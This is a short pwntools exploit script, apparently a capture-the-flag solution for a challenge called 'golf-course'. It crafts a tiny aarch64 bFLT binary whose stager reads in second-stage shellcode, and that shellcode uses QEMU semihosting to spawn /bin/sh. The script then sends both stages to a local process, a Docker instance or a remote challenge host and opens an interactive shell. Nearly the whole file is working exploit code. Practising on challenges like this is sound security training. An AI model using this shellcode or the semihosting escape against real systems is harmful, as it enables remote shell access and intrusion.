from pwn import *

context.update(arch='aarch64', os='linux')
context.log_level = 'debug'

# spend a couple of hours messing with elf from tmpout
# and came to conclusion that its impossible to adapt it
# so quick look at qemu source revealed presence of
# FLAT file format

sc =  b'bFLT'
sc += b'\x00\x00\x00\x00\x00\x00\x00\x04'
sc += b'\x00\x00\x00\x00\x00\x00\x00\x14'

# `mov x0, #0` used instuction encoded using two zero
# bytes in front and used here as a nop for setting 
# size of data and bss segment as remote have 32M memory limit

stager = asm("""
        add x1, sp,#0x100
        mov x0, #0
        mov x2, #0x100
        mov x0, #0
        mov x8, #0x3f
        mov x0, #0
        svc #0
        mov x0, #0
        blr x1
""")

sc += stager

pad = b'\x00\x00\x00\x00'

sc += pad*(11-(len(stager)>>2))

# call /bin/sh using semihosting
shellcode = asm("""
  mov x2, 0x7
  str x2, [sp, #(8 * 1)]

  adr x1, bin_sh
  str x1, [sp, #(8 * 0)]

  mov x1, sp

  mov w0, #0x12
  hlt #0xf000
bin_sh:
  .asciz "/bin/sh"
""")

if args.LOCAL:
  r = process('./golf-course')
  r.readuntil(b'file:')
  r.send(sc)
  r.send(shellcode)
  r.interactive()

if args.DOCKER:
  r = remote('localhost', 5000)
  r.readuntil(b'file:')
  r.send(sc)
  r.send(shellcode)
  r.interactive()

if args.REMOTE:
  r = remote('chal.nbctf.com', 30171)
  r.readuntil(b'file:')
  r.send(sc)
  r.send(shellcode)
  r.interactive()

